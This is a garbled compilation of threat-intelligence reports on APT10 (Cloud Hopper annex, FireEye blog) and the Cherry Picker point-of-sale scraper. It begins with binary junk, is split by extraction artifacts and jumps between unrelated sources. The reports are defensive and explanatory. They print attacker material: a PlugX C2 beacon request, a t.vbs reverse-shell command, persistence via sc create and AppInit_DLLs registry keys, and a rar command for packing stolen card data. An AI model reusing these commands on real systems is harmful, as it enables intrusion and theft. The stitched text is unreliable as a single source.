zX.O...>.*&P..r.................2.......?{<..e.F......uh1o..%tH.V+R.m..O1....... ...H.%..kD...v... !1..n..zV%...R...i.}...wk Apart from the specified port 443, it may also use ports 53, 80, and 995. The remote commands received from the C2 allow the malware to do the following: Download a file from a specified URL, and save it under a specified filename; Operation Cloud Hopper Technical Annex 17 Connect to a remote server, using a specified IP and port number; Start up a so called \" RedLeavesCMDSimulator \" - a console session that will accept commands from the memory pipe \\\\ \\\\ . \\\\ pipe \\\\ NamePipe_MoreWindows . The received commands will then be ex ecuted with the command line interpreter cmd.exe .; Enumerate all Remote Desktop sessions, and for each session, retrieve information that includes the logged on user name and the status of the session; Run the executable specified in the configuration, usi ng specified user session ID, e.g.: o C: \\\\ windows \\\\ system32 \\\\ RedLeaves.exe o %TEMP% \\\\ obedience.exe ; Execute remote command with: o cmd.exe /c start ; Enumerate/search files; Delete specified files; Enumerate drives; and Retrieve detailed system information that inclu des: o Hostname; o OS version number, platform; o Memory information; o Network parameters; o Time elapsed since the system was started; o User account information: name, group, privilege info; and , o CPU information. As tactical malware, RedLeaves is a versatile tool t hat would allow APT10 to quickly gain a foothold and further exploit the access before the actor deploys more sustained malware like PlugX or Quasar. Sustained Malware Sustained malware is used by APT10 to consolidate their access to a network, and ensure that they are able to maintain that access even if stolen credentials are changed. The malware detailed in this section is designed to facilitate long term access to networks. Throughout the time we have been tracking APT10, we have seen them progress from Poison Ivy as the sustained malware tool of choice, to PlugX and more recently Quasar. Poison Ivy Poison Ivy is an extendible malware family and was commonly used by APT10 between 2009 and 201. Poison Ivy has been widely reported on in the past, most nota bly by FireEye in their report Poison Ivy: Assessing Damage and Extracting Intelligence . 11 One of the latest Poison Ivy binaries known to have been used by APT10, compiled in mid - 2014, has an MD5 hash of 08A268A4C473F9920B254A6B6FC62548 . This instance of Poison Ivy has been configured with the password: happyyongzi . While not a common password, it is still used by the threat actor and has been previously associated with them. This sample communicated with the C2 server last.p6p6.net , whi ch is a domain controlled by APT10, and registered using the email address wangtongbao1957@gmail.com . It also registers a mutex, K!@DKFK#* , and further analysis of the code reveals several references to WindowXarBot , which is likely to be the name of t he malware. Further to this, the actor has not 11 https://www.fireeye.com/content/dam/fireeye - www/global/en/current - threats/pdfs/rpt - poison - ivy.pdf Operation Cloud Hopper Technical Annex 18 removed the debug path, D: \\\\ code \\\\ Projects \\\\ WindowXarbot \\\\ Release \\\\ WindowXarbot.pdb again referencing WindowXarBot . Figure 19 : Poison Ivy PlugX PlugX is a modular malware family with a myriad of functions and capabilities and as a result, it can be easily extended. It is likely that this design has been used to maintain robustness and allow for agility in functionality. While Poi son Ivy and PlugX do not have a common codebase, recent analysis revealed the addition of Poison Ivy functi 12 This supports our finding in relation to APT10 retooling from Poison Ivy to PlugX, standardising and enhancing their approach to malware development. PlugX binaries almost always come in the same form, as a self - extracting archive , created using option. The initial SFX file extracts three binaries to a temporary folder: 1. Legitimate bi nary (Filetype: Executable); 2. Malicious DLL used for sideloading (Filetype: Dynamic Link Library); and , 3. Encrypted configuration file (Filetype: Data). The legitimate binary is executed and recognises the DLL as legitimate and attempts to load it. The malici ous DLL, also known as the PlugX loader, decrypts and decompresses the configuration file. In our example, we show the loading of the encrypted configuration file. 12 http://blog.jpcert.or.jp/2017/02/plugx - poison - iv - 919a.html Operation Cloud Hopper Technical Annex 19 Figure 20 : Pushing the encrypted configuration file, msseces.asm , into String2 The configuration loads the payload into memory, by creating and injecting code into both svchost.exe and msiexec.exe . The header of the msiexec.exe is wiped in memory and replaced by the standard PlugX header \" GULP \". The running process, msi exec.exe , can be found as a child process of svchost.exe. PlugX maintains persistence via the creation of a registry key as well as a service, which checks regularly to confirm if PlugX is still running. The payload will call back to any of the four C2s in the configuration file. The controller will respond with additional plugins or modules to load onto the system. Throughout our investigations and tracking of the threat actor, we have seen the following binaries being used for sideloading: Legitimate bin ary abused for sideloading Belongs to AVK.exe G - Data Antivirus (G - Data) cicmdf.exe CreateInstall Free installer (CreateInstall) ciquick.exe CreateInstall Quick installer (CreateInstall) k7sysmon.exe K7SysMon Module (K7 Antivirus) mfeann.exe McAfee VSCore Announcer (Intel Security) MsMpEng.exe Windows Defender (Microsoft) pokerstarsbr.exe Rational Embedded Browser Client Software (Poker Stars) RC.exe Microsoft Resource Compiler (Microsoft) Setup.exe Microsoft .NET Framework (Microsoft) ShortcutF ixer.exe ShortcutFixer (Glary Utilities) vba32arkit.exe VBA32 Anti - Rootkit (VBA32) Shown in Figure 21 are all the example combinations we have observed from APT10. Operation Cloud Hopper Technical Annex 20 Figure 21 : Legitimate binaries used for sideloading PlugX by APT10 All of the PlugX versions observed being used by APT10 are Type I, which is the earliest known PlugX version. A breakdown of PlugX historic activity is g . 13 The PlugX we have observed beacons over p ort 443. An example of this is shown below: POST /update?id=0070f858 HTTP/1.1 Accept: */* MJ1X: 0 MJ2X: 0 MJ3X: 61456 MJ4X: 1 User - Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3) Host: nttdata.otzo.com:443 Content - Length: 0 Connection: Keep - Alive Cache - Control: no - cache 13 https://www.blackhat.com/docs/asia - 14/materials/Haruyama/Asia - 14 - Haruyama - I - Know - You - Want - Me - Unplugging - PlugX.pdf Operation Cloud Hopper Technical Annex 21 Quasar In early 2017, we encountered a new malware family used by APT10, a custom loader for the open source remote access have an in - house software development team to create bespoke tools utilising a custom .NET loader to deliver the malware. While many of the QuasarRAT configuration settings are l eft at their default values within the malw are, the threat actor has been observed using field to uniquely identify its victim organisations. We identified the thre at actor installing Quasar in victim environment s with the following commands: \"c: \\\\ windows \\\\ Microsoft.NET \\\\ Framework64 \\\\ v4.0.30319 \\\\ InstallUtil.exe\" /logfile= /LogToConsole=false /u \"c: \\\\ windows \\\\ Microsoft.NET \\\\ Framework \\\\ v4.0.30319 \\\\ WPF \\\\ wpf - etw.dat\" InstallUtil.exe is the legitimate .NET Framework Installer Tool that is digitally signed by Mi crosoft, and wpf - etw.dat is a 32 - bit DLL compiled with .NET, which has been obfuscated using ConfuserEx . 14 The main loop of the payload enumerates all files in C: \\\\ Windows \\\\ Microsoft.NET , reading each file over 300k in size, decoding it via AES and attempting to load it as an assembly. The threat actor in this case placed the loader and the encoded file in separate directories, with the secondary encoded blob in a parent directory of the loader, a technique used to increase the complexity of detectin g the payload. In our observations the payload was located in C: \\\\ Windows \\\\ Microsoft.NET named microsoft.workflow.compiler.dat . Decoding the payload uncovers another .NET b Client.exe . Analysis found that there was a time delt a of almost a month between the compile date of the loader and the later compile date of the payload. This highlights that the loader operates independently from the payload, effectively trying to identify and launch any AES - encoded .NET assembly in the ta rget directory or subdirectories. Initial analysis of the namespaces in the payload, show that the malware is in fact the open source QuasarRAT . 15 We confirmed this by comparing the source code from GitHub with binaries obtained from our research, shown for comparison in Figure 22 and Figure 23 . 14 https://yck1509.github.io/ConfuserEx/ 15 https://github.com/quasar/QuasarRAT Operation Cloud Hopper Technical Annex 22 Figure 22 : Payload namespaces Figure 23 : GitHub source code tree The code itself has been obfuscated, with many class and function names converted to arbitrary Unicode strings. Key elements of the configuration can be decoded from the obfuscated code. The variable names are obfuscated, and the variable contents are Base64 encoded and AES encrypted with nrgHOnEniJY9vpVZjS0Z Applying a decoder over these variables results in the shown in Figure 24 c onfiguration block: Figure 24 : Quasar configuration Operation Cloud Hopper Technical Annex 23 This Quasar sample communicates with the following C2 domains: ctldl.itunesmusic.jkub.com iamges.itunesmusic.jkub.com ipv4.itunesmusic.jkub.com v4.itunesmusic.jkub.com Analysis of this infrastructure shows other related subdomains which can be linked to APT10 activity. Figure 25 : Quasar C2 links to other APT10 domains Since this sample was analysed we have identified several more domains linke d to this infrastructure. These have been added to the IOC list (Annex A) provided with the main Operation Cloud Hopper report. Operation Cloud Hopper Technical Annex 24 APT10: Scripts and Tools In addition to the tactical and sustained malware used by APT10, we have also observed the use of multiple freely available scripts and tools established. t.vbs We have encountered the following script, t.vbs , which research has shown to be a modified version of the pentesting script known in open source as wmiexec.vbs . 16 The tool is used to execute a variety of commands on remote hosts, ranging from performing rec onnaissance on the network, to dumping credentials or executing malware. We have observed it being dropped into legitimate directories such as C: \\\\ Recovery , C: \\\\ Intel or C: \\\\ PerfLogs . The , and . Figure 26 : Single Command Mode In single command mode, the script logs the user into the remote machine using Windows Management Instrumentation (WMI), and creates a Server Message Block (SMB) share, which is usually se t to C: \\\\ Windows or C: \\\\ Windows \\\\ TEMP . The command will then be executed on the target system, and the output will be piped to a file within the newly mounted drive as wmi.dll , which is not a DLL file as the name would suggest, but is instead a dummy extensio n used to avoid detection. The new wmi.dll file is then copied to another file called wmi.dll.bak in the same directory, and the original is removed. The content of this wmi.dll.bak file is then sent back to the host, by reading its contents from the SMB s hare. Once the file has been read, wmi.dll.bak is deleted and the mounted SMB share is dropped. The script is also capable of running as a reverse shell, which uses the same tactics as single command mode, but with some differences. Instead of executing a single command, receiving the output, and dropping the share, the threat actor is presented with a reverse shell prompt. With this reverse shell, they are able to execute as many commands as they wish, and instead of removing the share after each command, the share is kept for the entire duration of the connection. The wmi.dll and wmi.dll.bak files are still created and deleted after each command. An example command is shown: 16 https://github.com/Twi1ight/AD - Pentest - Script/blob/master/wmiexec.vbs Operation Cloud Hopper Technical Annex 25 cscript.exe //nologo t.vbs /shell target_IP target_username target_password Figure 27 : An example of the t.vbs reverse shell Comparison of t.vbs and the original wmiexec.vbs , revealed that both scripts were almost identical, with the exception of: wmiexec.vbs contains a help option, which will display all of the possible commands that can be used. This is missing from t.vbs , most likely to hide the functionality of the file to anyone who discovers it, and to reduce the file size. t.vbs contains an option to save the output of the executed command by adding the - saveresult argument, and saves wmic.dll into the SMB share. Commands issued via t.vbs can sometimes be retrieved from the memory or pagefile of the target system. After dumping strings from a memory image, the commands can be identified by searching for strings containing wmi.dll 2>&1 . Detect.vbs Another script used by APT10, detect.vbs , is a Visual Basic Script file which includes network discovery functionality. Once detect.vbs is executed, it decodes and drops two Base64 encoded binary files whic certutil.exe . These two files are dropped on the system in the same location as the script. The first of these two files, subnet.exe , is used to enumerate subnets defined in the VBscript, while the second of these two f iles, rund11 32 .exe , is tcping.exe as described later below. As part of the script, it builds an array of IP addresses based off preconfigured ranges. The purpose of this script is to detect and scan other systems which may be used by the threat actor to c onduct lateral movement. In the version we recovered from a compromised system, the script provider. The script is highly likely used post - compromise. Mpsvc.d ll Mpsvc.dll is a file used by APT10 to launch a repacked version of the open - source post - exploitation tool Mimikatz. The tool is able to extract plaintext passwords, hashes and Kerberos tickets from memory. 17 17 https://github.com/gentilkiwi/mimikatz Operation Cloud Hopper Technical Annex 26 The DLL is sideloaded by the legitimate 64 - bit MsMpEng.exe used by the threat actor to install PlugX, as is mentioned in the targeted executables table. MsMpEng.exe - installed AntiVir us software . Mimik atz is frequently used in interactive intrusion operations , although this is the first time we have observed it being side loaded. consl64.exe This is a ctually a DLL file containing a repacked version of another credential dumping tool, PwDump6. PwDump6 i s able to extract NTLM and LanMan hashes from a target Windows system, and can also dump password histories if available. 18 It uses a similar tactic to Mpsvc.dll to inject itself into memory by side - loading through legitimate Lexmark printer software. csvde.exe csvde.exe is a legitimate Microsoft administration command line tool used to import and export data from Active Directory (AD) Services. 19 It is of note that this binary requires elevated permissions as well as the AD Services (alternative AD Lightweight Directory Services) role to execute correctly. APT10 has been observed using it to export region specific AD data via the following comman d: - f C: \\\\ windows \\\\ web \\\\ This was run multiple times and resulted in the actor likely mapping out User and Host Names for the network. nbt.exe nbt.exe was identified to be a copy of nbtscan or NetBIOS scanner. 20 NetBIOS scanner is a portable C - based tool designed to scan for open Netbios nameservers on a local or remote network. NetBIOS has been leveraged by APT10 to search for services of interest across the IT estate, footprinting endpoints of interest. NetBIOS can be used to ide ntify system information such as host names and any available file shares. tcping.exe tcping.exe is a freely available online tool by the same name. 21 While d escribed by the author as a ping , it works over APT10 using the tool to probe for port status on specific hosts of interest. It was observed probing ports 445 and 3389, attempting to assess the status of file sharing services and RDP respectively. psexe.exe APT10 was also seen to be using PsExec, a core application from the tool set. 22 PsExec is designed to be a lightweight, dependency free, telnet replacement which will allow the user to execute programs or applications on a remote host. PsExec is an attract ive tool of choice for any threat 18 https://github.com/mcandre/fgdump/blob/c883 704e5e34d7aa8fce6fb0a0777df3ebb693ac/pwdump6/pwservice.cpp 19 https://technet.microsoft.com/en - us/library/cc732101(v=ws.11).aspx 20 http://www.unixwiz.net/tools/nbtscan.html 21 https://www.elifulkerson.com/projects/tcping.php 22 https://technet.microsoft.com/en - gb/sysinternals/bb897553.aspx Operation Cloud Hopper Technical Annex 27 actor given the level of interaction it facilitates without the need to install any additional client software. NetSess.exe NetSess is a freely available command line tool of the same name used to enumerate NetBIOS sessio ns on a specified machine. 23 APT10 was observed using the tool to conduct network reconnaissance of rundll32.exe rundll32.exe is a renamed legitimate PSCP client that normally comes bundled with PuTTY. 24 It had been renamed from p scp.exe to rundll32.exe to hide its true nature from analysts. APT10 was observed using this tool to exfiltrate data from victim networks. svchost.exe svchost.exe is the 64 - bit, Chinese simplified console application of rar.exe , version 5.30, released 18t h November 2015, which is legitimate Winrar software. 25 rar.exe was almost certainly renamed to svchost.exe to hide its true nature from analysts. APT10 used this software to compress files before exfiltration from victim networks. 23 http://www.joeware.net/freetools/tools/n etsess/index.htm 24 http://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.67.html 25 http://www.rarlab.com/ Operation Cloud Hopper Technical Annex 28 CoreImpact Tools Our analysis has identified that APT10 uses a number of tools normally packaged within CoreImpact, a commercial penetration testing suite. These tools have been converted into executable binaries using PyInstaller, meaning that they can be executed on any system. secretsdump.exe secretsdump.exe was compiled from secretsdump.py perform various techniques to dump secrets from the remote machine without executing any agent there 26 atexec.exe atexec.exe , originally atexec.py , is a script able to execute an arbitrary command on a remote target machine through the Task Scheduler service, and return the output of that command to the host. 27 psexec.exe This tool has functionality very similar to th tool psexec.exe , which is used to remotely execute administration commands. The tool is compiled from psexec.py 28 and uses the open source psexec replacement program RemCom 29 to execute commands without the need to install any client software. 26 https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py 27 https://www.coresecurity.com/corelabs - research/open - source - tools/impacket 28 https://github.com/CoreSecurity/impacket/blob/impacket_0_9_13/examples/psexec .py 29 https://github.com/kavika13/RemCom Operation Cloud Hopper Technical Annex 29 Recommendations Given the scale and scope of the campaigns outlined in our Operation Cloud Hopper report, we recommend that organisations use the indicators provided in Annex A to protect their systems and identify potenti al compromises. This includes blacklisting them, searching historical logs, and additionally, ensuring that anti - virus or anti - malware applications are up - to - date and running. Additionally, staff at organisations who may be targeted should also be aware that there is a heightened risk from this threat actor at the present time. As we have outlined in the report, this campaign serves to highlight the importance of organisations activities further point to the need for independent access to threat intelligence, incident response and, threat detection and monitoring capabilities. Given the upturn in retooling tempo over the last six months, it is clear that there is a need for cyber security researchers to intensify activity and collaboration in research into this threat actor, to develop a full and holistic view This publication has been prepared for general guidance on matters of interest only, and does not constitute professional advice.

They have historically targeted construction and engineering, aerospace, and telecom firms, and governments in the United States, Europe, and Japan. We believe that the targeting of these industries has been in support of Chinese national security goals, including acquiring valuable military and intelligence information as well as the theft of confidential business data to support Chinese corporations. PwC and BAE recently issued a joint blog detailing extensive APT10 activity.\\nAPT10’s Resurgence\\nIn June 2016, FireEye iSIGHT intelligence first reported that APT10 expanded their operations. The group was initially detected targeting a Japanese university, and more widespread targeting in Japan was subsequently uncovered. Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques.\\nGlobal Targeting Using New Tools\\nLeveraging its global footprint, FireEye has detected APT10 activity across six continents in 2016 and 2017. APT10 has targeted or compromised manufacturing companies in India, Japan and Northern Europe; a mining company in South America; and multiple IT service providers worldwide. We believe these companies are a mix of final targets and organizations that could provide a foothold in a final target.\\nAPT10 unveiled new tools in its 2016/2017 activity. In addition to the continued use of SOGU, the current wave of intrusions has involved new tools we believe are unique to APT10. HAYMAKER and SNUGRIDE have been used as first stage backdoors, while BUGJUICE and a customized version of the open source QUASARRAT have been used as second stage backdoors. These new pieces of malware show that APT10 is devoting resources to capability development and innovation.\\nHAYMAKER is a backdoor that can download and execute additional payloads in the form of modules. It also conducts basic victim profiling activity, collecting the computer name, running process IDs, %TEMP% directory path and version of Internet Explorer. It communicates encoded system information to a single hard coded command and control (C2) server, using the system’s default User-Agent string.\\nBUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it. That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload. BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2. It has the capability to find files, enumerate drives, exfiltrate data, take screenshots and provide a reverse shell.\\nSNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests. Messages are encrypted using AES with a static key. The malware’s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell. Persistence is maintained through a Run registry key.\\nQUASARRAT is an open-source RAT available here. The versions used by APT10 (1.3.4.0, 2.0.0.0, and 2.0.0.1) are not available via the public GitHub page, indicating that APT10 has further customized the open source version. The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload. QUASARRAT is a fully functional .NET backdoor that has been used by multiple cyber espionage groups in the past.\\nTraditional and Novel Methods\\nThis recent APT10 activity has included both traditional spear phishing and access to victim’s networks through service providers. (For more information on infection via service providers see M-Trends 2016). APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g. “Redacted_Group_Meeting_Document_20170222_doc_.exe) and in some cases simply identically named decoy documents and malicious launchers within the same archive.\\nIn addition to the spear phishes, FireEye ISIGHT Intelligence has observed APT10 accessing victims through global service providers. Service providers have significant access to customer networks, enabling an attacker who had compromised a service provider to move laterally into the network of the service provider’s customer. In addition, web traffic between a service provider’s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily. A notable instance of this observed by FireEye involved a SOGU backdoor that was set to communicate with its C2 through a server belonging to the victim’s service provider.\\nAPT10 actors issued the following commands to a SOGU implant at a victim:\\nsc create CorWrTool binPath= \"\\\\\"C:\\\\Windows\\\\vss\\\\vixDiskMountServer.exe\\\\\"\" start= auto displayname= \"Corel Writing Tools Utility\" type= own\\nsc description CorWrTool \"Corel Graphics Corporation Applications.\"\\nping -a Redacted\\npsexec.exe <orghost> d.exe\\nnet view /domain:Redacted\\nproxyconnect - \"port\": 3389, \"server\": \"IP Address Redacted\"\\nThese commands included setting persistence on the victim’s system. The actor then tested connectivity to an IP managed by the victim’s service provider. Once connectivity to the service provider IP was verified, the actor established the service provider IP as a proxy for the victim’s SOGU backdoor. This effectively routes SOGU malware traffic through the victim’s service provider, which likely indicates a foothold on the service provider’s network. The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous.\\nImplications\\nAPT10 is a threat to organizations worldwide. Their abuse of access to service provider networks demonstrates that peripheral organizations continue to be of interest to a malicious actor – especially those seeking alternative angles of attack. We believe the pace of APT10 operations may slow following the public disclosure by the PwC/BAE blog; however, we believe they will return to their large-scale operations, potentially employing new tactics, techniques and procedures.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n24 Feb 2020Ransomware Against the Machine: How Adversaries are Learning to Disrupt\\nIndustrial Production by Targeting IT and OT\\n20 Feb 2020M-Trends 2020: Insights From the Front Lines\\n19 Feb 2020The Missing LNK — Correlating User Search LNK files\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages', 'Nick Carr on Twitter: \"BUGJUICE == REDLEAVES\\nHAYMAKER == CHCHES\\nSNUGRIDE == https://t.co/xovYDkIjdN… \"\\nWe\\'ve detected that JavaScript is disabled in your browser.

This targeted Point of Sale (PoS) memory scraper has enjoyed a very low detection rate in the wild for quite some time. Cherry Picker uses a new memory scraping algorithm, a file infector for persistence, and cleaner malware that removes all traces of the infection from target systems. This sophisticated functionality and highly targeted victims have helped the malware remain under the radar of many AV and security companies. This post will expose the functionality of Cherry Picker and hopefully help organizations provide protection from this threat.\\nThe Past\\nIn 2011 Trustwave\\'s forensic analysts worked on a case involving several pieces of malware that worked in concert to obtain Card Holder Data (CHD) from memory of the target process.\\nFilenameHashCompile Datesearcher.dllB532B2C489EC2989AA976151D9E3878323B9AAD20AF0DC8538F1B303794491622009-11-05 20:12:18sr.exeE81D12CB40A32A233780328D0BB73598D393C47049847DBBA24881DE034BF9382009-11-05 20:12:12\\nSr.exe is a command line interface that accepts n\\xa0Process IDs (PID) and injects the searcher.dll into each process. Searcher.dll looks for CHD in the injected process and writes out the found data to a plain text file as %WINDIR%\\\\system32\\\\Data.txt directory. These samples are fairly well detected with both files being flagged by a large number of AVs as a generic banking Trojan or Point of Sale (PoS) memory scraper. However, this tool set never seems to be alone on the system. Our investigations have found it being used with, or embedded in, an AutoIt script such as fishnetsecurity\\xa0discusses. TrendMicro\\xa0found it in use with another PoS memory scraper called Rdasrv. Trustwave\\'s malware researchers presented this\\xa0threat at the Sector conference detailing exactly how they worked as well as including both Cherry Picker and Searcher artifacts in a SANS course: Sniper Forensics.\\nSo not exactly under the radar huh? Okay, fair enough. Just like in all the infomercials we get to the part you all know… BUT WAIT! There\\'s more.\\nCherry Picker\\nCherry Picker is a set of malware that has also been seen on systems in conjunction with searcher.dll; however, unlike Searcher it has gone largely unnoticed by the AV and security community. While Searcher has remained unchanged on the various cases it has been seen on, Cherry Picker has undergone consistent improvement over the years. So what is Cherry Picker exactly? There are essentially been 3 versions of the main malware:\\nFilename:\\xa0Pserver32.dll\\nVersionHashCompile Date1CB71B31AF4BC5A5D3F541BEFF87ECBFD55F24BA7AD6249484608E359D880F2DD2009-12-05 05:12:212AC1837B37A495BEDF644A2824CD36F2BFB34CAD122C26E1FE497146A8F2A16A42010-03-04 13:22:5933F366CCED9473CFBEDA0245F5817699D5BEB81D0AB4D2C81E1E3DCB7DCE7465D2015-02-01 01:13:33\\nIf this were a legitimate development project these versions would be minor version updates. Each one adds a small amount of functionality to the previous version.\\nLoading\\nBefore we can talk about the meat of Cherry Picker\\'s functionality, we need to take a look at how the DLL is loaded into memory. In the searcher.dll case, sr.exe was used to inject the scraper into the memory of a target running process. No persistence was used to perform this function automatically. Cherry Picker has two different ways to install persistence. In several of the cases, a registry file was discovered, that when ran added pserver32.dll the following registry key:\\nHKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\n\"AppInit_DLLs\"=\"pserver32.dll\"\\nFrom the Microsoft support site:\\n\"The AppInit_DLLs are loaded by using the LoadLibrary()\\xa0function during the DLL_PROCESS_ATTACH\\xa0process of User32.dll. Therefore, executables that do not link with User32.dll does not load the AppInit_DLLs. There are very few executables that do not link with User32.dll.\"\\nIn order for the DLL to be loaded from the AppInit_DLLs registry key, it must be \"turned on\". This is accomplished by setting the following registry key to 1:\\nHKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\n\"LoadAppInit_DLLs\"=0x00000001\\nThis causes numerous applications to load the malicious DLL at startup. On the most recent case our analysts found an additional install mechanism that greatly increased the options available to the attacker. The author upgraded sr.exe to srf.exe:\\nsrf.exe7AB1F21B41134FF21476760434569383D8FD55D444DF035C900F330B13F70CBD2010-03-02 16:35:23\\nSrf requires that the first argument match a hardcoded string (\"password\") in the binary. This may help it prevent AVs from marking it as malware since it exits without performing any malicious activity. Srf provides a handy usage to show what options are available to install the malware:\\nThe injection option is still here, although it has been expanded to include the ability to inject into all running processes, processes by name, or processes by PID. They can also install/uninstall a variable DLL name into the AppInit_DLLs registry key (which is what they mean by autorun). Then there is the patch DLL option. This option is a sophisticated file infector that patches the legitimate user32.dll on disk to first load the malicious DLL provided in the option before continuing on with the legitimate functionality of the system DLL. Srf uses a little known legitimate function of windows (sfc_os.dll #5) to disable system write protection on all 3 versions of user32.dll stored on the system. The legitimate copy is then copied to the same directory under user32.tmp before adding a DllEntryPoint to user32.dll with malicious code to load the supplied DLL.\\nThis is the entry point for the legitimate user32.dll:\\nAfter the modification, the new entry point is DllEntryPoint:\\nEvery time user32.dll is loaded by an application, pserver32.dll is loaded first and then the legitimate code is executed. This has basically the same effect as AppInit_DLLs registry key but without leaving the tell tale traces that can be found by a forensic analyst. The majority of Windows executables load user32.dll.\\nThe Config\\nThe first thing the malware does is look for a hardcoded filename in the current working directory that contains configuration information. In version 1 the config file was name graph32.dll\\xa0and was a plaintext file with the header \"config\". The lines after that contain \"key=value\" pairs that set options available to the malware. The API GetPrivateProfileIntA and GetPrivateProfileStringA are used to parse the plain text file and obtain the configuration values. In version 2 a new type of config file was introduced and the hardcoded filename changed to: kb852310.dll. While the plain text config was still supported, if the malware doesn\\'t find the \"config\" header it will attempt to decode the file using a custom de-obfuscation algorithm. I have reversed this algorithm and written a python script, which writes out the de-obfuscated config to disk. The script can be found here. The plain-text config and the obfuscated config are parsed in two different manners but contain essentially the same information. The one difference is the obfuscated config can contain a public key, which will allow Cherry Picker to encrypt CHD before writing it to the exfiltration file. Both configs contain the following fields:\\nTarget ProcessProcess name to target for injectionFTP UsernameUsername for logging into FTP serverFTP PasswordPassword for logging into FTP serverFTP HostHostname/IP for FTP serverFTP PassiveUse FTP Passive modeRAR PasswordPassword for creating encrypted RAR archivesRAR TemplateNaming template for encrypted RAR archivesCHD dump file locationFull path to CHD file ex: C:\\\\Windows\\\\system32\\\\sysss.dllTimeWhat time to perform exfiltration of dump files. Ex: time=2045 (8:45PM)TimeoutTime to wait before scraping memory\\nThis is how Cherry Picker came by its name. The configuration specifies a target process that it expects to be loaded in. If the parent process does not match the name specified by this field the malware will exit. This implies that the malware author already has scouted the system and knows exactly what process they are targeting. Just like a cherry picker in basketball, Cherry Picker all the other processes on the system to target one process and go after that sweet, sweet card data.\\nOff and Running\\nOnce the malware has loaded the configuration file and verified that it is running in the correct process, a mutex is created. This prevents multiple copies from spawning on the system and synchronizes the collection of CHD and the exfiltration of files. In version 1 and 2 the hardcoded mutex was:\\nGlobal\\\\\\\\Srch1Mutex\\nVersion 3 changed the name to:\\nGlobal\\\\\\\\SYNC32TOOLBOX\\nThe malware runs two threads. The first thread is responsible for finding the CHD in the process, writing the results to a file, and preparing the files for exfiltration. The location of the exfiltration file, time to perform the exfiltration, and destination are all contained in the configuration file.\\nCherry Picker enumerates the files in the %WINDIR%\\\\System32\\xa0directory and builds a list of all .rar files that are found. It then begins to loop through the memory of the target process looking for CHD and writing it out to the file specified by the config for exfiltration. In version 3 of the malware, the author introduces a new technique\\xa0for scraping memory using the API QueryWorkingSet. We will be releasing a follow up to this blog tomorrow detailing this technique.\\nIf a public key is in the config, the data in encrypted before writing it to the exfiltration file, otherwise it is written in plain text. Once the system time matches the exfiltration time listed in the configuration file, the malware will add the file containing the CHD to an encrypted archive using the following command:\\nrar m <template_rar_filename> <exfil_file> 0 -y -hp<password>\\nThis thread will then release the mutex and sleep for 15 seconds plus the configured sleep timer. It will then re-acquire the mutex and repeat the above process indefinately.\\nThe second thread is responsible for exfiltrating the file to the FTP server specified in the configuration file. This thread waits for the mutex to be released and then FTPs all .rar files contained in the global list to the FTP server. If the config is missing the FTP username or password, it will use the IP in the configuration file to perform a POST request to /update.php on the server. The archive is deleted after it is exfiltrated from the system.\\nThis thread also maintains a log of the activities on the system based on the file path given in the configuration file. However, in all the observed configs there was no path listed which caused the log file to be written to %WINDIR%\\\\0.log (or just 0 depending on the version). This file contains a log of the exfiltration attempts and is exfiltrated with the CHD:\\n<time_date_stamp> <exfil_file_size> <rar_exfil_name>\\nThe Cleanup\\nIt is rare for malware authors to clean up artifacts on an infected system. On one of the systems the forensic analyst was able to discover a file that did exactly this and more. The author went above and beyond writing a cleaner that return the system to a \"clean\" state. This cleaner was highly targeted, and contained hardcoded paths to the malware, exfiltration files, and the legitimate files on the system. The recent compile time of the cleaner also points to the cleaner being written for the current malware campaign.\\nCvc.exeC79C6EB598E496B27263B59858FC394AC6262302D63C7FD6CD5148852EA0E7442015-06-30 03:57:24\\nCvc looks for the TeamViewer process running on the system and injects code into it if it finds it, exiting if it doesn\\'t exist. TeamViewer is a free third party remote desktop software. The use of weak or default passwords on remote admin tools is a common initial vector of compromise on PoS systems and was likely the ingress method for the most recent forensic case involving Cherry 